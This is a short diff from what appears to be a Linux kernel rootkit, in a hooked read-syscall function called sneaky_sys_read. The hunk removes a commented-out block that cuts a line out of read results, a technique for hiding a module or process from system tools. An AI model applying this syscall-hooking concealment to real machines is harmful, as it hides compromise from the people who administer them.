@@ -139,23 +139,6 @@ asmlinkage long sneaky_sys_read(struct pt_regs *regs)
       return nbytes;*/
       }
   }
-
-  /*if (start != NULL)
-  {
-
-    for (end = start; end < (start + nbytes); end++)
-    {
-
-      if (*end == '\n')
-      {
-        end = end + 1; // include the newline                                                                                                                                        
-        size_t n_bytes = (buff + nbytes) - end;
-        memmove(start, end, n_bytes);                                                                                                                                              
-        nbytes -= (end - start);                                                                                                                                                     
-        return nbytes;
-        }
-    }
-  }*/
   return nbytes;
 }
 
